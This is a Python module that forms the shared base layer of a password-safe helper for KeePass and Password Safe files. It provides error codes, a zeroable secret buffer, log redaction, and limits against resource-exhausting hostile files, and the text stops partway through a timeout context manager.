#!/usr/bin/env python3
"""backends/base.py — the shared foundation every cockpit-secrets backend sits on.

Same house contract as wg-admin / adlab-admin / hs-admin (see
cockpit-wireguard/docs/CONTRACT.md and docs/CONTRACT.md here):

  - `secrets-admin` is the ONLY entry point; the plugin never runs raw commands
  - every verb prints ONE JSON object on stdout and NOTHING else
  - diagnostics, warnings and notes go to stderr
  - exit 0 = success; on failure stdout carries {"error": ..., "detail": ...}

This module owns everything that is *not* format-specific:

    error taxonomy      SecretsError and its eight subclasses (docs/CONTRACT.md)
    secret lifetime     Secret — a zeroable bytearray with a hard-won honest docstring
    process hardening   harden_process() — I14
    file opening        open_safe_fd() — the O_NOFOLLOW + fstat guard, I4/I5
    durable writes      atomic_replace() — backup -> tmp -> fsync -> replace, I12/I13
    concurrency         LockFile — .kdbx.lock / .plk, I13
    hostile-input caps  Limits — I7
    the adapter ABC     Backend — the interface kdbx.py and psafe3.py implement
    log hygiene         redact(), constant_time_eq() — I6/I15

Design rules, all load-bearing:

  - **Nothing decrypted leaves a backend before its MAC has verified** (I6). Both
    formats force decrypt-then-authenticate somewhere (PWS3 puts its HMAC at the
    end of the file; KDBX4's inner XML is attacker-shaped until the block HMACs
    check out), so "verify before use" is a discipline this layer names and the
    backends must keep. Every MAC/hash comparison goes through
    `hmac.compare_digest` — never `==`.
  - **A wrong passphrase and a failed MAC are the same error to the caller**
    (`BadCredential`). Distinguishing them turns the unlock verb into a
    decryption oracle. The distinction is recorded in the audit log, not
    returned.
  - **No secret ever reaches argv, the environment, a temp file or a log line**
    (I10, I15). `SecretsError` runs every `detail` through `redact()` against the
    set of live `Secret` objects before storing it, so a passphrase cannot reach
    the client even through a mistake in a backend.
  - **A verb names a registry id, never a path** (I4). This module still takes
    paths, because it is below the registry — the caller (`secrets-admin`) is
    what resolves an id to a path, and this module is what refuses to follow a
    symlink once it has one (I5).

stdlib only. No pip. Python 3.9+ (developed and self-checked on 3.14.4).

Run this file directly to execute its self-check:

    python3 backends/base.py        # exits 0 when every invariant holds
"""

import abc
import base64
import binascii
import ctypes
import ctypes.util
import errno
import hashlib
import hmac
import json
import os
import re
import resource
import secrets as _sysrandom
import signal
import stat
import sys
import time
import weakref
from typing import NamedTuple

__all__ = [
    # error taxonomy
    "SecretsError", "AccessDenied", "NotFound", "LockedOut", "BadCredential",
    "Conflict", "Unsupported", "Invalid", "Internal",
    "ERROR_CODES", "ERROR_CLASSES",
    # secret handling
    "Secret", "constant_time_eq", "redact", "REDACT_MIN_LEN", "REDACTED",
    # process and file primitives
    "harden_process", "open_safe_fd", "SafeFile", "Fingerprint",
    "atomic_replace", "validate_new_path", "LockFile", "backup_dir_for",
    # policy
    "Limits",
    # the adapter interface
    "Backend", "register_backend", "backend_for", "known_formats",
    "VERSION",
]

VERSION = "1.0.0"


# ===========================================================================
# constant-time comparison and log redaction  (I6, I15)
# ===========================================================================

def constant_time_eq(a, b):
    """Compare two byte strings without leaking their contents through timing.

    Accepts `bytes`, `bytearray`, `memoryview` or `str` on either side; `str` is
    encoded UTF-8 first (`hmac.compare_digest` refuses mixed str/bytes and
    refuses non-ASCII `str` outright, which would turn a non-ASCII passphrase
    into a crash instead of a comparison).

    This is the ONLY comparison permitted for a MAC, a key-hash, a handle token
    or a password. `==` on any of those is bad practice #10 in
    docs/UPSTREAM-REVIEW.md §4 and a timing oracle in practice.

    Length still leaks — `compare_digest` is constant time only for equal-length
    inputs. That is inherent and is why callers compare fixed-width digests.
    """
    if isinstance(a, str):
        a = a.encode("utf-8", "surrogatepass")
    if isinstance(b, str):
        b = b.encode("utf-8", "surrogatepass")
    # bytearray/memoryview are accepted by compare_digest; normalise anyway so a
    # caller passing a Secret's live buffer cannot trip an implementation detail.
    return hmac.compare_digest(bytes(a), bytes(b))


REDACTED = "***"

# Secrets shorter than this are NOT redacted. Replacing a 1- or 2-byte string
# everywhere it occurs would shred every log line into asterisks and destroy the
# diagnostics the audit log exists for — and the mangling pattern would itself
# advertise the secret's length. Honest statement of the trade: a two-character
# passphrase is not protected by this filter. It is also not protected by
# anything else, including the KDF.
REDACT_MIN_LEN = 3

# Live Secret objects, held WEAKLY. redact() consults this set when the caller
# does not name the secrets explicitly, so "the filter is applied to everything
# the helper writes" is one call rather than a discipline. Weak on purpose: this
# registry must never be the reason a secret outlives its zero().
_LIVE_SECRETS = weakref.WeakSet()


def _redaction_candidates(item):
    """Every textual rendering of one secret that could show up in a log line.

    A passphrase can reach a string through more routes than the obvious one: a
    JSON request carries key-file bytes as base64 (`keyfile_b64`), a repr()
    escapes it, and a hexdump renders it as hex. All four forms are replaced.
    """
    out = []
    if isinstance(item, Secret):
        try:
            raw = bytes(item.bytes)
        except SecretsError:
            return []          # already zeroed — there is nothing left to leak
    elif isinstance(item, str):
        raw = item.encode("utf-8", "surrogatepass")
    else:
        raw = bytes(item)
    if len(raw) < REDACT_MIN_LEN:
        return []
    for decoded in (
        raw.decode("utf-8", "ignore"),
        raw.decode("latin-1"),
    ):
        if len(decoded) >= REDACT_MIN_LEN:
            out.append(decoded)
            # repr() of the value as it would appear inside a Python traceback.
            out.append(repr(decoded)[1:-1])
            # json.dumps() of the value, which is NOT the same string as repr()
            # and is the form the two blanket filters actually see. `emit()`
            # and `audit()` both call redact() on the OUTPUT of json.dumps, so
            # a secret containing a character json escapes and repr does not
            # was passed through untouched. Measured before this line existed:
            # a passphrase containing `"` came back as `\"` and a passphrase
            # containing NUL came back as a JSON \\u0000 escape, and neither matched any
            # candidate. repr() switches to single quotes rather than escaping
            # a double quote, and renders NUL as \x00, so it can never stand in
            # for this. Both settings of `ensure_ascii` are generated because
            # both are reachable: emit() passes False, and any other json.dumps
            # in the program defaults to True.
            for esc in (json.dumps(decoded, ensure_ascii=False)[1:-1],
                        json.dumps(decoded, ensure_ascii=True)[1:-1]):
                if len(esc) >= REDACT_MIN_LEN:
                    out.append(esc)
    out.append(base64.b64encode(raw).decode("ascii"))
    out.append(binascii.hexlify(raw).decode("ascii"))
    return [c for c in out if len(c) >= REDACT_MIN_LEN]


def redact(text, live=None):
    """Replace every occurrence of every live secret in `text` with `***`.

    `live` is an iterable of `Secret` objects, `bytes` or `str`. When it is None
    the module's weak registry of live `Secret` objects is used, which is what
    makes this usable as a blanket filter on the helper's stdout, stderr and
    audit log (I15).

    Longest candidate first, so a secret that also appears base64-encoded is
    fully covered rather than half-covered.

    This is a safety net, not a licence to log secrets. The primary rule is that
    a value never reaches a log call in the first place.
    """
    if not text:
        return text
    if not isinstance(text, str):
        text = str(text)
    items = list(_LIVE_SECRETS) if live is None else list(live)
    candidates = []
    for item in items:
        try:
            candidates.extend(_redaction_candidates(item))
        except Exception:
            # A secret that cannot be rendered cannot be leaked through this
            # string either. Skipping it must never mean emitting raw text, so
            # the failure is swallowed per-secret and the loop continues.
            continue
    for cand in sorted(set(candidates), key=len, reverse=True):
        text = text.replace(cand, REDACTED)
    return text


_CONTROL_CHARS = re.compile(r"[\x00-\x08\x0b-\x1f\x7f]")


def _sanitize_detail(text, limit=240):
    """Make a `detail` string safe to put on stdout inside one JSON object.

    Collapses newlines (one JSON object per verb — a stray newline in a detail
    is a contract violation), strips control characters (an attacker-supplied
    lock-file holder or filename could carry a terminal escape sequence), and
    truncates. Redaction happens in `SecretsError.__init__`, not here.
    """
    if text is None:
        return ""
    if not isinstance(text, str):
        text = str(text)
    text = _CONTROL_CHARS.sub("", text)
    text = " ".join(text.split())
    if len(text) > limit:
        text = text[: limit - 1] + "…"
    return text


# ===========================================================================
# error taxonomy  (docs/CONTRACT.md "Error taxonomy")
# ===========================================================================

class SecretsError(Exception):
    """Base of the eight-code taxonomy the helper is allowed to emit.

    The wire shape is fixed by docs/CONTRACT.md and is deliberately coarse so it
    cannot be used as an oracle:

        {"error": "<code>", "detail": "operator-safe sentence"}

    TWO RULES THAT ARE NOT NEGOTIABLE, stated here loudly because this is the
    one place every failure in the program passes through:

    1. **`BadCredential` covers a wrong passphrase AND a failed MAC, and nothing
       distinguishes them to the caller.** Not the code, not the detail, not the
       timing (the caller applies `Limits.FAIL_FLOOR_SECONDS`). If a wrong
       password answered differently from a corrupt file, `unlock` would be a
       decryption oracle: an attacker could flip a ciphertext byte and learn
       whether the parser got further. The distinction is written to the audit
       log, where only root can read it. (I6)

    2. **No subclass may ever be constructed with a decrypted value in
       `detail`.** Not a password, not an entry title, not a custom-field value,
       not a filename from the request, not a traceback. Details are for the
       operator, and this host's job-runner logs are group-readable — `wg-admin`
       learned that the hard way. As a backstop, every `detail` is passed
       through `redact()` against the live `Secret` registry before it is
       stored, so a mistake in a backend still cannot ship a passphrase to the
       browser. Do not treat that backstop as permission. (I6, I15)

    `code` is a class attribute so `raise Invalid("...")` is all a caller writes
    and the wire code follows automatically.
    """

    code = "internal"

    def __init__(self, detail=""):
        # Redact FIRST (against live secrets), then sanitise for the JSON line.
        # Order matters: sanitising first could split a secret across the
        # truncation boundary and defeat the replacement.
        self.detail = _sanitize_detail(redact(detail))
        super().__init__("%s: %s" % (self.code, self.detail) if self.detail
                         else self.code)

    def to_json(self):
        """The exact object docs/CONTRACT.md says goes on stdout on failure."""
        return {"error": self.code, "detail": self.detail}

    def __repr__(self):
        return "%s(%r)" % (type(self).__name__, self.detail)


class AccessDenied(SecretsError):
    """The caller is not entitled to this safe, this handle, or this verb.

    Used for: the admin class without euid 0; the user class where the file is
    not owned by the caller; a handle created by another uid or another process;
    a symlinked or wrong-owner safe file; a registry entry whose `mode` is `ro`
    on a write verb; a backend that is not unlocked.

    Presenting a handle you do not own is deliberately access-denied and NOT
    not-found, so handle enumeration tells an attacker nothing (docs/CONTRACT.md
    "handle semantics").
    """
    code = "access-denied"


class NotFound(SecretsError):
    """The named registry id, entry uuid, group, attachment or file is absent.

    Never used to report that a caller may not see something — that is
    AccessDenied. Confusing the two turns this code into an enumeration oracle.
    """
    code = "not-found"


class LockedOut(SecretsError):
    """Too many failed unlocks for this (uid, safe id); backoff is in force (I16).

    `detail` may name the remaining seconds — a number the caller already knows
    it is waiting for. It must not name the safe's owner or any value.
    """
    code = "locked-out"


class BadCredential(SecretsError):
    """Wrong passphrase, wrong key file, OR a MAC that failed to verify (I6).

    Read the class docstring on SecretsError before you consider splitting this
    into two codes. It is one code on purpose. The `detail` for every cause must
    be the SAME sentence — a different sentence is the same oracle as a
    different code.
    """
    code = "bad-credential"


class Conflict(SecretsError):
    """Someone else changed the file, or holds its lock (I13).

    Raised by `atomic_replace` when the on-disk fingerprint no longer matches
    the one captured at unlock, and by `LockFile` when a foreign `.kdbx.lock` or
    `.plk` is present. Never resolved by merging and never resolved by forcing —
    a conflict is a decision for the operator, surfaced as one.
    """
    code = "conflict"


class Unsupported(SecretsError):
    """The format, the feature or the verb is not implemented on this path.

    Used for: a format with no backend installed; a YubiKey slot with no
    ykman/libykpers present; a KDBX3 write (the format cannot be written safely,
    I20); a verb that a later task has not landed yet. Degrading to a clear
    `unsupported` is required — a silent fallback to a weaker path is banned.
    """
    code = "unsupported"


class Invalid(SecretsError):
    """The request, the registry entry, or the FILE is malformed or out of range.

    This is the code for hostile input that is refused before it costs anything:
    an Argon2 `m` of 4 GiB, a PWS3 `ITER` of 2^31, a declared field length of
    0xFFFFFFFF, a truncated file, a relative path, a registry entry that fails
    schema validation (I7).

    Note the deliberate split from BadCredential: a file that is structurally
    broken *before* any key is derived is `invalid`, because refusing it leaks
    nothing about the passphrase. A file that decrypts to a failing MAC is
    `bad-credential`, because saying otherwise would.
    """
    code = "invalid"


class Internal(SecretsError):
    """Anything that got here by surprise. The class name, never the traceback.

    The helper's top-level barrier converts an unexpected exception into
    `Internal(type(exc).__name__)`. Not `str(exc)` — an OSError's string carries
    a path, a UnicodeDecodeError's string carries a fragment of the data that
    failed to decode, and either can be a value out of the safe (I15).
    """
    code = "internal"


#: The eight codes, in the order docs/CONTRACT.md lists them. `secrets-admin`
#: uses this to assert it can never emit a ninth.
ERROR_CODES = (
    "access-denied", "not-found", "locked-out", "bad-credential",
    "conflict", "unsupported", "invalid", "internal",
)

#: code -> class, for tests and for the schema verb's enum.
ERROR_CLASSES = {
    cls.code: cls
    for cls in (AccessDenied, NotFound, LockedOut, BadCredential,
                Conflict, Unsupported, Invalid, Internal)
}


# ===========================================================================
# Secret — a zeroable buffer for passphrase and key-file bytes  (I14)
# ===========================================================================

class Secret:
    """A context-managed `bytearray` holding passphrase or key-file bytes.

    READ THIS DOCSTRING BEFORE TRUSTING THIS CLASS.

    **This class shrinks the window in which a secret is readable from the
    helper's memory. It does not close it.** Python cannot be made to guarantee
    otherwise, and pretending it can is bad practice #13 in
    docs/UPSTREAM-REVIEW.md §4:

      - `str` is immutable and small strings are interned. The moment a secret
        becomes a `str` — and `pykeepass` demands one, so `str_view()` exists —
        the interpreter owns a copy on the GC heap that no code of ours can
        overwrite. It disappears when the GC gets to it, or at process exit,
        whichever is first. `str_view()` is the leak we cannot close; it is a
        method rather than a property so that every use of it is a visible,
        greppable decision.
      - `bytes(secret.bytes)` makes an immutable copy with the same problem.
        Pass `secret.bytes` (the live bytearray) to hashlib/hmac/ctypes
        directly; they accept the buffer protocol and copy nothing.
      - A `bytearray` can grow, and growth REALLOCATES: the old allocation is
        freed without being wiped. This class therefore never appends. The
        buffer is sized once, at construction.
      - Even a perfectly wiped buffer can already have been paged to swap or
        captured by `gcore`. `harden_process()` addresses core dumps and ptrace
        and makes a best-effort `mlockall`; docs/THREAT-MODEL.md states plainly
        that root on this host is out of scope.

    What this class *does* buy: the passphrase in the helper's own buffer is
    zeroed deterministically in `__exit__` and in every `finally`, the helper
    lives for one operation, and `repr()` can never print the value.

    Use it as a context manager wherever possible:

        with Secret(request["password"]) as pw:
            db = backend.unlock(pw)
        # pw is zeroed here whether or not unlock raised

    **Footgun, found by this file's own self-check and left in as a warning:**
    never let a Secret be a temporary while you hold its buffer.

        buf = Secret.from_b64(req["keyfile_b64"]).bytes   # WRONG
        # the Secret's refcount hit zero on that line, __del__ ran, and `buf`
        # is now an empty bytearray

    That is the class doing exactly what it promises — zeroing the moment
    nothing holds it — and it means "bind the Secret to a name, then use
    `.bytes`". Always:

        kf = Secret.from_b64(req["keyfile_b64"])
        try:
            backend.unlock(pw, keyfile=kf)
        finally:
            kf.zero()
    """

    # __slots__ on purpose: no instance __dict__ means no accidental second
    # reference to the value stashed as an attribute. __weakref__ is kept so the
    # redaction registry can hold this object weakly.
    __slots__ = ("_buf", "_zeroed", "__weakref__")

    def __init__(self, data=None):
        """`data` may be `str`, `bytes`, `bytearray`, `memoryview` or None.

        A `str` source is copied to UTF-8 bytes and the `str` itself is left for
        the GC — unavoidable, and the reason callers should read the passphrase
        straight out of the JSON request into a Secret and then drop every other
        reference to it.
        """
        if data is None:
            buf = bytearray()
        elif isinstance(data, str):
            buf = bytearray(data.encode("utf-8", "surrogatepass"))
        elif isinstance(data, (bytes, bytearray, memoryview)):
            buf = bytearray(data)
        else:
            raise Invalid("secret must be text or bytes")
        self._buf = buf
        self._zeroed = False
        _LIVE_SECRETS.add(self)

    # -- construction ------------------------------------------------------

    @classmethod
    def from_b64(cls, text):
        """Build a Secret from the base64 a request carries key-file bytes in.

        Honest note: `base64.b64decode` returns an immutable `bytes` that we
        copy into the bytearray and then drop. That intermediate cannot be
        wiped. It is one more GC-owned copy on top of the `str` the JSON parser
        already made — which is why the request framing caps stdin at
        `Limits.MAX_REQUEST_BYTES` and the helper's lifetime is one operation.
        """
        if text is None:
            return cls(None)
        if not isinstance(text, str):
            raise Invalid("keyfile_b64 must be a string")
        try:
            raw = base64.b64decode(text, validate=True)
        except (binascii.Error, ValueError):
            # Never echo the offending text: it is key material.
            raise Invalid("keyfile_b64 is not valid base64")
        if len(raw) > Limits.MAX_KEYFILE_BYTES:
            raise Invalid("key file exceeds %d bytes"
                          % Limits.MAX_KEYFILE_BYTES)
        return cls(raw)

    @classmethod
    def random(cls, nbytes=32):
        """Cryptographically random bytes (`secrets.token_bytes`), for handles
        and lock-file tokens. Never `random` — bad practice, and the token is
        what binds a handle to a caller."""
        return cls(_sysrandom.token_bytes(nbytes))

    # -- access ------------------------------------------------------------

    @property
    def bytes(self):
        """The LIVE bytearray. Pass it to hashlib/hmac/ctypes; do not copy it."""
        if self._zeroed:
            raise Invalid("secret has already been zeroed")
        return self._buf

    def str_view(self):
        """UTF-8 `str` for libraries that will not take bytes (pykeepass).

        **This is the leak we cannot close.** The returned `str` is immutable
        and possibly interned; `zero()` cannot reach it. Call it as late as
        possible, hold the result in the narrowest scope you can, and drop the
        reference immediately. Every call site is a documented, deliberate
        exception to "secrets live in wipeable buffers".
        """
        if self._zeroed:
            raise Invalid("secret has already been zeroed")
        return self._buf.decode("utf-8", "surrogatepass")

    @property
    def zeroed(self):
        return self._zeroed

    def __len__(self):
        return 0 if self._zeroed else len(self._buf)

    def __bool__(self):
        """Truthy only while it holds bytes. `if pw:` is the idiomatic
        "was a passphrase supplied?" test, and a zeroed secret is falsy."""
        return (not self._zeroed) and len(self._buf) > 0

    # -- lifetime ----------------------------------------------------------

    def zero(self):
        """Overwrite the buffer IN PLACE, then clear it. Idempotent.

        In place is the whole point: `self._buf = bytearray()` would drop the
        old allocation unwiped for the allocator to hand to the next caller.
        The slice assignment writes over the actual memory first.
        """
        if not self._zeroed:
            n = len(self._buf)
            if n:
                self._buf[:] = b"\x00" * n     # overwrite, do not rebind
            del self._buf[:]                    # then release the length
            self._zeroed = True
        _LIVE_SECRETS.discard(self)

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc, tb):
        self.zero()
        return False        # never swallow the exception

    def __del__(self):
        # Best effort only. CPython refcounting usually makes this prompt, but
        # a reference cycle or interpreter shutdown can delay or skip it — which
        # is exactly why every caller also zeroes in a `finally`.
        try:
            self.zero()
        except Exception:
            pass

    # -- rendering ---------------------------------------------------------

    def __repr__(self):
        """Length only. A Secret must be safe to interpolate into any log line,
        because sooner or later one of them will be (I15)."""
        return "<Secret %s len=%d>" % (
            "zeroed" if self._zeroed else "live", len(self))

    __str__ = __repr__

    # Deliberately NOT implemented: __eq__, __hash__ by value, __format__,
    # __bytes__, __getstate__. Comparison goes through constant_time_eq() so it
    # cannot become a timing oracle; pickling a Secret would write it to disk.


# ===========================================================================
# Limits — the clamps that stop a hostile FILE from spending this host  (I7)
# ===========================================================================

class Limits:
    """Hard ceilings on everything an attacker-controlled file gets to choose.

    KDBX carries its Argon2 `m`/`t`/`p` in the header and PWS3 carries `ITER`;
    both are read from the file BEFORE any key is derived, which means a hostile
    file gets to name how much of this machine the helper spends. On the admin
    path the helper is root. Every constant below is checked before the
    expensive operation runs, not after.
    """

    # -- KDBX key derivation ----------------------------------------------
    #: Argon2 memory, KiB. 1 GiB. Stops "m=4194304" (4 GiB) — a one-line remote
    #: OOM against a root process, and an OOM-killer event that takes unrelated
    #: services with it. KeePassXC's own UI maxes out far below this.
    ARGON2_MAX_MEMORY_KIB = 1024 * 1024
    #: Argon2 time cost. Stops "t=1000000" — an unbounded CPU burn that pins a
    #: core for hours and hangs the Cockpit channel behind it.
    ARGON2_MAX_TIME = 32
    #: Argon2 parallelism. Stops "p=255" — 255 threads inside a helper that is
    #: supposed to live for milliseconds; a fork-bomb by proxy.
    ARGON2_MAX_PARALLELISM = 8
    #: AES-KDF (KDBX 3.x and KDBX4-with-AESKDF) transform rounds. 1e8 is already
    #: several seconds. Stops "rounds=2^31", which is a wall-clock DoS with no
    #: memory footprint for an RSS ceiling to catch.
    AESKDF_MAX_ROUNDS = 100_000_000

    # -- PWS3 key stretching ----------------------------------------------
    #: Format V3 floor. Below this the file is either ancient or crafted; either
    #: way stretching it is cheap enough to be a guessing accelerator.
    PWS3_MIN_ITER = 2048
    #: Read ceiling. Stops "ITER=0x7fffffff": iterated SHA-256 with no memory
    #: cost, so the only brake is this number.
    PWS3_MAX_ITER = 8_388_608
    #: WRITE floor — Password Safe's own current default. We never write a file
    #: weaker than the reference implementation would, even when we read one.
    PWS3_WRITE_MIN_ITER = 262_144

    #: Wall-clock budget for one key derivation. Enforcement is honest but
    #: after-the-fact: neither Argon2 in argon2-cffi nor an iterated-SHA256 loop
    #: in C can be interrupted from Python, so `kdf_budget()` DETECTS an overrun
    #: and refuses the result rather than preventing the burn. The parameter
    #: clamps above are the actual prevention; this is the backstop that turns
    #: "slow" into a typed error instead of a hung channel.
    KDF_WALL_CLOCK_SECONDS = 20.0
    #: RSS ceiling to set around a derivation (RLIMIT_AS), 1.5 GiB — a little
    #: above ARGON2_MAX_MEMORY_KIB so a legal maximum still succeeds and an
    #: illegal one fails as an allocation error rather than an OOM kill.
    KDF_MAX_RSS_BYTES = 1536 * 1024 * 1024

    #: Wall-clock budget for turning an AUTHENTICATED payload into an in-memory
    #: database — decompression, the XML parse, the protected-value pass and the
    #: index build. Everything upstream of this is bounded by a size or a
    #: parameter clamp; this stretch was bounded by nothing at all, and the cost
    #: is not a function of any number we check. Measured: a 3.8 MB KDBX4 file
    #: carrying MAX_ENTRIES protected values that fail to decode spent 46 s of
    #: 100%-CPU and 313 MB of RSS inside `PyKeePass(...)` and was then ACCEPTED,
    #: because pykeepass evaluates `tree.getpath(elem)` — which is O(position) —
    #: once per failing value. No clamp catches that, and the next quadratic in
    #: a dependency will not be caught by a clamp either.
    #:
    #: 20 s matches KDF_WALL_CLOCK_SECONDS deliberately: the two budgets bound
    #: the two halves of one unlock, and an operator should not have to learn
    #: two numbers. Unlike the KDF budget this one is PREEMPTIVE where it can be
    #: (see `parse_budget`).
    PARSE_WALL_CLOCK_SECONDS = 20.0

    # -- file and payload sizes -------------------------------------------
    #: Largest safe file we will open at all. Stops "point the registry at a
    #: 40 GiB file and watch the helper read it to compute a fingerprint".
    MAX_SAFE_BYTES = 128 * 1024 * 1024
    #: Largest decompressed KDBX inner payload. Stops a compression bomb: a few
    #: KiB of gzip that expands without bound (I8's sibling hazard).
    MAX_INNER_BYTES = 256 * 1024 * 1024
    #: Belt to that brace — refuse a stream whose expansion ratio is absurd even
    #: while it is still under MAX_INNER_BYTES.
    MAX_DECOMPRESS_RATIO = 200
    #: Entries per safe. Stops a file that claims 10^9 records and makes the
    #: helper build the list before anything notices.
    MAX_ENTRIES = 100_000
    #: Groups per safe, and how deep they may nest. 10 000-deep nesting is in
    #: the malformed corpus precisely because a recursive walker blows the
    #: Python stack on it.
    MAX_GROUPS = 20_000
    MAX_GROUP_DEPTH = 64
    #: One attachment. Stops "declared length 2 GiB" turning into an allocation.
    MAX_ATTACHMENT_BYTES = 32 * 1024 * 1024
    #: Archived versions of ONE entry that `history` will enumerate. Every
    #: other collection in this class had an explicit clamp and this one did
    #: not: it was bounded only transitively, by the parse having already been
    #: bounded, which is an argument about a file we have already read rather
    #: than a limit on what we will build from it. KeePass's own
    #: `HistoryMaxItems` defaults to 10 and a human-maintained entry does not
    #: reach three figures, so a file with more than this is telling you
    #: something about its author, not about its content.
    MAX_HISTORY_VERSIONS = 1_000
    #: One field's data. A hostile PWS3 field length of 0xFFFFFFFF must fail in
    #: O(1) against this and against the remaining file size — never by trying.
    MAX_FIELD_BYTES = 4 * 1024 * 1024
    #: Key file. KeePass key files are 32-ish bytes to a few KiB; 1 MiB is
    #: generous and still refuses "send the helper a 2 GiB key file".
    MAX_KEYFILE_BYTES = 1024 * 1024
    #: The helper's stdin cap (I10). One JSON object, and a hostile caller must
    #: not be able to balloon the helper by streaming into it forever.
    MAX_REQUEST_BYTES = 1024 * 1024

    # -- durability and policy --------------------------------------------
    #: Backup ring defaults and ceiling (I12).
    DEFAULT_BACKUP_KEEP = 10
    MAX_BACKUP_KEEP = 100
    #: Constant floor on a failed unlock (I16): a wrong passphrase must never
    #: return faster than a right one, or the timing is the oracle the error
    #: taxonomy was flattened to avoid.
    FAIL_FLOOR_SECONDS = 0.75
    #: Default reveal/clipboard countdown, seconds (I17). The UI reads this from
    #: the schema verb; it is here so helper and UI cannot disagree.
    REVEAL_SECONDS = 15

    # -- checkers ----------------------------------------------------------
    # Each returns None and raises Invalid. They exist so kdbx.py and psafe3.py
    # cannot each grow their own slightly-different idea of "too big".

    @classmethod
    def check_argon2(cls, memory_kib, time_cost, parallelism):
        """Refuse out-of-range Argon2 parameters BEFORE derivation (I7)."""
        for name, value in (("memory", memory_kib), ("time", time_cost),
                            ("parallelism", parallelism)):
            if not isinstance(value, int) or isinstance(value, bool):
                raise Invalid("Argon2 %s parameter is not an integer" % name)
            if value <= 0:
                raise Invalid("Argon2 %s parameter is not positive" % name)
        if memory_kib > cls.ARGON2_MAX_MEMORY_KIB:
            raise Invalid("Argon2 memory %d KiB exceeds the %d KiB limit"
                          % (memory_kib, cls.ARGON2_MAX_MEMORY_KIB))
        if time_cost > cls.ARGON2_MAX_TIME:
            raise Invalid("Argon2 time cost %d exceeds the limit of %d"
                          % (time_cost, cls.ARGON2_MAX_TIME))
        if parallelism > cls.ARGON2_MAX_PARALLELISM:
            raise Invalid("Argon2 parallelism %d exceeds the limit of %d"
                          % (parallelism, cls.ARGON2_MAX_PARALLELISM))

    @classmethod
    def check_aeskdf_rounds(cls, rounds):
        """Refuse an AES-KDF transform-round count that is a wall-clock DoS."""
        if not isinstance(rounds, int) or isinstance(rounds, bool):
            raise Invalid("AES-KDF round count is not an integer")
        if rounds <= 0:
            raise Invalid("AES-KDF round count is not positive")
        if rounds > cls.AESKDF_MAX_ROUNDS:
            raise Invalid("AES-KDF rounds %d exceed the limit of %d"
                          % (rounds, cls.AESKDF_MAX_ROUNDS))

    @classmethod
    def check_pws3_iter(cls, iterations, for_write=False):
        """Range-check PWS3 `ITER`; `for_write` applies the 262144 floor."""
        if not isinstance(iterations, int) or isinstance(iterations, bool):
            raise Invalid("PWS3 ITER is not an integer")
        floor = cls.PWS3_WRITE_MIN_ITER if for_write else cls.PWS3_MIN_ITER
        if iterations < floor or iterations > cls.PWS3_MAX_ITER:
            raise Invalid("PWS3 ITER %d is outside [%d, %d]"
                          % (iterations, floor, cls.PWS3_MAX_ITER))

    @classmethod
    def check_length(cls, declared, remaining, what="field"):
        """Bounds-check a length header against the bytes that actually remain.

        The point is that this costs O(1): a declared length of 0xFFFFFFFF must
        be refused by arithmetic, never by attempting the allocation and letting
        MemoryError decide (I7, and bad practice #7).
        """
        if not isinstance(declared, int) or declared < 0:
            raise Invalid("%s length is not a valid size" % what)
        if declared > cls.MAX_FIELD_BYTES:
            raise Invalid("%s length %d exceeds the %d byte limit"
                          % (what, declared, cls.MAX_FIELD_BYTES))
        if declared > remaining:
            raise Invalid("%s length %d exceeds the %d bytes remaining"
                          % (what, declared, remaining))

    @classmethod
    def kdf_budget(cls, seconds=None):
        """Context manager that refuses a derivation which overran its budget.

        Usage:

            with Limits.kdf_budget():
                key = argon2_hash(...)

        Documented limitation, repeated from KDF_WALL_CLOCK_SECONDS because it
        matters: this cannot interrupt the C call. It raises `Invalid` on exit
        when the wall clock overran, so the derived key is discarded and the
        caller gets a typed error instead of an answer it waited a minute for.
        Prevention is `check_argon2` / `check_aeskdf_rounds` / `check_pws3_iter`
        running first.
        """
        return _KdfBudget(cls.KDF_WALL_CLOCK_SECONDS if seconds is None
                          else seconds)

    @classmethod
    def parse_budget(cls, seconds=None, what="opening this database"):
        """Context manager that STOPS work which overran its budget.

        Usage:

            with Limits.parse_budget():
                kp = PyKeePass(io.BytesIO(data), transformed_key=tk)

        The difference from `kdf_budget`, and the reason both exist: a KDF is a
        single C call that Python cannot interrupt, so that budget can only
        detect an overrun afterwards. Turning a payload into a database is
        Python-level iteration over attacker-shaped structure, and Python-level
        code IS interruptible — so this one arms `setitimer(ITIMER_REAL)` and
        raises out of the loop, which is the difference between refusing a
        hostile file in 20 s and returning a handle after 46 s of burnt CPU.

        The exception it raises derives from `BaseException`, not `Exception`.
        That is load-bearing: this fires deep inside pykeepass and construct,
        both of which have broad `except Exception` handlers that would
        otherwise swallow the timeout and carry on with a half-built tree.

        FAILS OPEN, ONCE, AND SAYS SO: `signal.setitimer` only works on the main
        thread of the main interpreter. When it is unavailable the budget
        degrades to the same after-the-fact refusal `kdf_budget` gives — the
        work still finishes, but the result is still discarded and the caller
        still gets a typed error rather than an answer it waited minutes for.
        """
        return _ParseBudget(cls.PARSE_WALL_CLOCK_SECONDS if seconds is None
                            else seconds, what)


class _KdfBudget:
    """Implementation detail of Limits.kdf_budget(); see that docstring."""

    __slots__ = ("seconds", "started", "elapsed")

    def __init__(self, seconds):
        self.seconds = float(seconds)
        self.started = 0.0
        self.elapsed = 0.0

    def __enter__(self):
        self.started = time.monotonic()
        return self

    def __exit__(self, exc_type, exc, tb):
        self.elapsed = time.monotonic() - self.started
        if exc_type is None and self.elapsed > self.seconds:
            raise Invalid("key derivation exceeded its %.1fs budget"
                          % self.seconds)
        return False


class _ParseTimeout(BaseException):
    """Raised by the SIGALRM handler `_ParseBudget` installs.

    Derives from `BaseException` on purpose — see `Limits.parse_budget`. It is
    never allowed to escape `_ParseBudget.__exit__`, which converts it to the
    `Invalid` the caller's taxonomy expects.
    """


class _ParseBudget:
    """Implementation detail of Limits.parse_budget(); see that docstring."""

    __slots__ = ("seconds", "what", "started", "elapsed", "_armed", "_prev")

    def __init__(self, seconds, what):
        self.seconds = float(seconds)
        self.what = what
        self.started = 0.0
        self.elapsed = 0.0
        self._armed = False
        self._prev = None

    def _fire(self, _signum, _frame):
        raise _ParseTimeout()

    def __enter__(self):
        self.started = time.monotonic()
        try:
            self._prev = signal.signal(signal.SIGALRM, self._fire)
            signal.setitimer(signal.ITIMER_REAL, self.seconds)
            self._armed = True
        except (ValueError, OSError, AttributeError):
            # Not the main thread, or no SIGALRM. Degrade, do not fail.
            self._armed = False
        return self

    def __exit__(self, exc_type, exc, tb):
        if self._armed:
            try:
